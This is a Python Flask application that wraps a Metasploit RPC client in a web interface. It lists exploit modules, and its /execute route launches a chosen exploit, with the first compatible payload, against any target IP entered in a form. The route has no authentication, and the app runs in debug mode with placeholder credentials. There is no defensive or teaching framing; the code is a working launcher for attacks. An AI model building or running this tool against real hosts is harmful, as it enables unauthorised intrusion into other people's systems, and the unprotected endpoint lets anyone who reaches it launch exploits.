
from flask import Flask, render_template, request, redirect, url_for, flash
from pymetasploit3.msfrpc import MsfRpcClient

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Replace with a secure key

# Initialize Metasploit RPC client
client = MsfRpcClient('yourpassword', port=55552, ssl=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/exploits')
def exploits():
    exploit_list = client.modules.exploits
    return render_template('exploits.html', exploits=exploit_list)

@app.route('/execute', methods=['POST'])
def execute():
    exploit_name = request.form.get('exploit')
    target_ip = request.form.get('target_ip')

    if not exploit_name or not target_ip:
        flash('Exploit and Target IP are required.')
        return redirect(url_for('exploits'))

    exploit = client.modules.use('exploit', exploit_name)
    exploit['RHOSTS'] = target_ip

    payload = exploit.targetpayloads()[0]  # Select the first compatible payload
    exploit.execute(payload=payload)

    flash(f'Exploit {exploit_name} launched against {target_ip}.')
    return redirect(url_for('exploits'))

if __name__ == '__main__':
    app.run(debug=True)
